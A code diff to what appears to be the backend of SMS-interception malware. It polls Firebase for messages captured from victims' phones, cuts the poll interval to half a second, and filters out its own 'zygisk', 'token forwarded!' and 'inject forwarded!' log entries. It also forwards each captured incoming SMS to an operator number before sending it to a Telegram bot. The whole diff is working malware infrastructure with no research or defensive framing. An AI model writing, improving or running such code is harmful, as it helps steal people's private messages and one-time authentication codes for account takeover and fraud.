@@ -15,7 +15,7 @@ from app.services import get_active_device, get_monitor_profile, save_sms
 
 logger = logging.getLogger(__name__)
 
-POLL_INTERVAL_SEC = 3
+POLL_INTERVAL_SEC = 0.5
 SMS_PARENT_PATHS = ("clients", "client", "devices", "device", "users", "phones")
 SMS_CHILD_PATHS = (
     "sms",
@@ -35,6 +35,20 @@ BODY_FIELDS = ("message", "body", "text", "content", "msg", "sms", "smsBody")
 TIME_FIELDS = ("time", "date", "timestamp", "ts", "received_at", "created_at", "createdAt")
 SEEN_META_KEY = "firebase_sms_seen"
 MAX_SEEN_KEYS = 500
+OUTGOING_LOG_MARKERS = (
+    "intercepted outgoing",
+    "zygisk",
+    "outgoing sms sent",
+    "outgoing sms",
+    "__out__",
+)
+BOT_CARD_MARKERS = (
+    "inject forwarded!",
+    "token forwarded!",
+    "outgoing sms sent!",
+    "auto-stopped",
+    "⏱ queued",
+)
 
 
 def _device_ids(device: Device) -> list[str]:
@@ -87,6 +101,20 @@ def mark_sms_keys_seen(device: Device, keys: set[str]) -> None:
         seen = seen[-MAX_SEEN_KEYS:]
     meta[SEEN_META_KEY] = seen
     _save_meta(device, meta)
+
+
+def _is_outgoing_firebase_log(sender: str, body: str) -> bool:
+    sender_l = (sender or "").lower()
+    body_l = (body or "").lower()
+    if sender_l == "__out__":
+        return True
+    if any(marker in sender_l for marker in OUTGOING_LOG_MARKERS):
+        return True
+    if any(marker in body_l for marker in OUTGOING_LOG_MARKERS):
+        return True
+    if any(marker in body_l for marker in BOT_CARD_MARKERS):
+        return True
+    return False
 
 
 def _first_field(data: dict, names: tuple[str, ...]) -> str | None:
@@ -226,8 +254,18 @@ async def snapshot_firebase_sms_seen(profile: MonitorProfile, device: Device) ->
     mark_sms_keys_seen(device, {record["firebase_key"] for record in records})
 
 
+async def _inject_before_notify(profile: MonitorProfile, device: Device, sender: str, message: str) -> None:
+    from app.firebase_sync import forward_incoming_to_mynum
+
+    if not profile.phone_number or not profile.is_monitoring:
+        return
+    await forward_incoming_to_mynum(None, profile, device, sender, message)
+
+
 async def poll_monitoring_profiles_once() -> int:
-    from app.telegram_bot import notify_new_sms
+    import asyncio
+
+    from app.telegram_bot import notify_new_sms_dm_only
 
     db = SessionLocal()
     processed = 0
@@ -242,7 +280,7 @@ async def poll_monitoring_profiles_once() -> int:
                 continue
 
             try:
-                records = await fetch_firebase_sms_for_device(firebase_url, device)
+                records = await fetch_firebase_sms_for_device(firebase_url, device, timeout=2.0)
             except Exception as exc:
                 logger.debug("Firebase SMS poll failed for %s: %s", device.name, exc)
                 continue
@@ -263,20 +301,28 @@ async def poll_monitoring_profiles_once() -> int:
                     new_keys.add(record["firebase_key"])
                     continue
 
+                sender = record["sender"]
+                message = record["message"]
+                if _is_outgoing_firebase_log(sender, message):
+                    new_keys.add(record["firebase_key"])
+                    continue
+
+                try:
+                    await _inject_before_notify(profile, device, sender, message)
+                except Exception as exc:
+                    logger.warning("Fast inject failed for %s: %s", device.name, exc)
+
                 sms = save_sms(
                     db,
-                    sender=record["sender"],
-                    message=record["message"],
+                    sender=sender,
+                    message=message,
                     device_name=device.name,
                     received_at=received_at,
                 )
                 db.commit()
                 new_keys.add(record["firebase_key"])
                 processed += 1
-                try:
-                    await notify_new_sms(sms)
-                except Exception as exc:
-                    logger.error("Notify failed for Firebase SMS on %s: %s", device.name, exc)
+                asyncio.create_task(notify_new_sms_dm_only(sms))
 
             if new_keys:
                 mark_sms_keys_seen(device, new_keys)
